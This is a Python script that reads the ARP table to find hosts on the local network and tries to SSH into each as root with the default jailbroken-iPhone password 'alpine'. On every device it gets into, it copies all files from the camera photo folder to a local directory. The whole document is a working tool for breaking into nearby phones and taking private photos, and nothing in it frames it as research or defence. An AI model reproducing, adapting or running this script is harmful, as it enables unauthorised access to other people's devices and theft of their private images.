import paramiko
import subprocess
import re
import os


# acquire ip addresses on network
arpScanResult = str( subprocess.run(['arp', '-a'], stdout=subprocess.PIPE) )
ipList = re.findall( re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), arpScanResult)

USERNAME = 'root'
PASSWORD = 'alpine'
REMOTEPATH = '/../../var/mobile/Media/DCIM/100APPLE/'
PORT = 22

client = paramiko.SSHClient()

# add untrusted hosts
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.load_system_host_keys() # is this needed?

#set up local directory
local_dir = 'extracted_photos' #Users/evanknapke2/Desktop/Pics'
os.path.exists(local_dir) or os.makedirs(local_dir)

def progress(transferred, toBeTransferred):
	print('Progress: {} out of {}'.format(transferred, toBeTransferred))

isConnected = False

# try to connect to each device on network
for ip in ipList:
	print('Trying to connect to %s ...' % ip)
	try:
		client.connect(ip, username=USERNAME, password=PASSWORD, timeout=3)
		isConnected = True
	except:
		print('Connection failed.')
		pass

	if isConnected:
		print('SSH connection established to %s' % ip)
		
		with paramiko.Transport( (ip, 22) ) as transport:
			transport.default_window_size=paramiko.common.MAX_WINDOW_SIZE
			transport.packetizer.REKEY_BYTES = pow(2, 40)
			transport.packetizer.REKEY_PACKETS = pow(2, 40)
			
			transport.connect(username=USERNAME, password=PASSWORD)
			with paramiko.SFTPClient.from_transport(transport) as sftp:
				try:
					fileList = sftp.listdir(REMOTEPATH)
					
					for file in fileList:
						local_path = os.path.join(local_dir, file)
						sftp.get(os.path.join(REMOTEPATH, file), local_path, callback=None)
						print('Downloaded ' + file)
					
				except FileNotFoundError:
					print('Unable to acces photo directory of %s' % ip)
					client.close()

		isConnected = False
